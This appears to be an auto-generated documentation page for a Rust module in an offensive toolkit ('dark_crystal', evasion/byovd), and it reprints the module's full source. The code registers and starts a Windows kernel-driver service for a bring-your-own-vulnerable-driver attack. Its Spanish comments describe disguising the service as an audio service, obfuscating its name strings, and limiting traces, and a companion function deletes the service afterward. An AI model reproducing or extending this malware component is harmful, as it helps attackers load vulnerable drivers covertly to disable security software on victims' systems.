# service

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/evasion/byovd/service.rs` |
| **Lines** | 64 |
| **Cards** | T018-byovd |
| **Role** | SCM service registration |

## Public API

### `register_and_start` (line 9)
```rust
pub fn register_and_start(driver_path: &Path) -> Result<()>
```

### `stop_and_delete` (line 44)
```rust
pub fn stop_and_delete() -> Result<()>
```

## Key Dependencies

- `use anyhow::{Context, Result};`
- `use windows_service::service::{`
- `use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};`

## Full Source

```rust
use anyhow::{Context, Result};
use std::ffi::{OsStr, OsString};
use std::path::Path;
use windows_service::service::{
    ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType,
};
use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

pub fn register_and_start(driver_path: &Path) -> Result<()> {
    // Usar un nombre que parece legítimo
    let service_name = crate::obf!("AudioRvxService");

    let manager =
        ServiceManager::local_computer(None::<OsString>, ServiceManagerAccess::CREATE_SERVICE)
            .context("No se pudo conectar al SCM")?;

    let service_info = ServiceInfo {
        name: OsString::from(service_name),
        display_name: OsString::from(crate::obf!("Audio Rendering Service")),
        service_type: ServiceType::KERNEL_DRIVER,
        start_type: ServiceStartType::OnDemand, // No AutoStart para minimizar rastro
        error_control: ServiceErrorControl::Normal,
        executable_path: driver_path.to_path_buf(),
        launch_arguments: vec![],
        dependencies: vec![],
        account_name: None,
        account_password: None,
    };

    // Verificar si ya existe
    if let Ok(service) = manager.open_service(&service_info.name, ServiceAccess::START) {
        // Ya existe, solo iniciar
        service.start(&[] as &[&OsStr]).ok();
        return Ok(());
    }

    // Crear e iniciar
    let service = manager.create_service(&service_info, ServiceAccess::START)?;
    service.start(&[] as &[&OsStr])?;

    Ok(())
}

pub fn stop_and_delete() -> Result<()> {
    let service_name = crate::obf!("AudioRvxService");

    let manager = ServiceManager::local_computer(None::<OsString>, ServiceManagerAccess::CONNECT)?;

    let service = match manager.open_service(
        service_name,
        ServiceAccess::STOP | ServiceAccess::DELETE | ServiceAccess::QUERY_STATUS,
    ) {
        Ok(s) => s,
        Err(_) => return Ok(()), // Si no existe, no hacemos nada
    };

    // Detener
    let _ = service.stop();

    // Eliminar
    service.delete()?;

    Ok(())
}

```